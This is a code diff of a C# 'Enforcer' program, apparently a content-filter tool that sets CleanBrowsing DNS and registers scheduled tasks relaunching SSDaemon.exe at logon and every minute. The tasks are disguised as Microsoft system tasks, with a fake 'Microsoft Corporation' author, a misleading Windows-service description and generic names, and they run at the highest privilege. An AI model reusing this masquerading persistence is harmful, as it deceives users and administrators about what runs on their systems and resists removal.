@@ -80,16 +80,16 @@ namespace Enforcer
                         filePadlock.Close();
                     using (var taskService = new TaskService())
                     {
-                        taskService.RootFolder.DeleteTask("SvcStartupTask", false);
-                        taskService.RootFolder.DeleteTask("SvcMonitorTask", false);
+                        taskService.RootFolder.DeleteTask("SvcStartup", false);
+                        taskService.RootFolder.DeleteTask("SvcMonitor", false);
                     }
                     watchdog.Kill();
                 }
                 else
                 {
                     SetCleanBrowsingDNS();
-                    RegisterTask("SvcStartupTask", new LogonTrigger(), new ExecAction(Path.Combine(exePath, "SSDaemon.exe")));
-                    RegisterTask("SvcMonitorTask", new TimeTrigger() { StartBoundary = DateTime.Now, Repetition = new RepetitionPattern(TimeSpan.FromMinutes(1), TimeSpan.Zero) },
+                    RegisterTask("SvcStartup", new LogonTrigger(), new ExecAction(Path.Combine(exePath, "SSDaemon.exe")));
+                    RegisterTask("SvcMonitor", new TimeTrigger() { StartBoundary = DateTime.Now, Repetition = new RepetitionPattern(TimeSpan.FromMinutes(1), TimeSpan.Zero) },
                         new ExecAction(Path.Combine(exePath, "SSDaemon.exe"), "0"));
                     Thread.Sleep(4000);
                 }        
@@ -163,7 +163,7 @@ namespace Enforcer
                 var taskDefinition = taskService.NewTask();
                 taskDefinition.Settings.DisallowStartIfOnBatteries = false;
                 taskDefinition.RegistrationInfo.Author = "Microsoft Corporation";
-                taskDefinition.RegistrationInfo.Description = "Ensures critical Windows service processes are running.";
+                taskDefinition.RegistrationInfo.Description = "Ensures all critical Windows service processes are running.";
                 taskDefinition.Principal.RunLevel = TaskRunLevel.Highest;
                 taskDefinition.Principal.LogonType = TaskLogonType.S4U;
                 taskDefinition.Triggers.Add(taskTrigger);
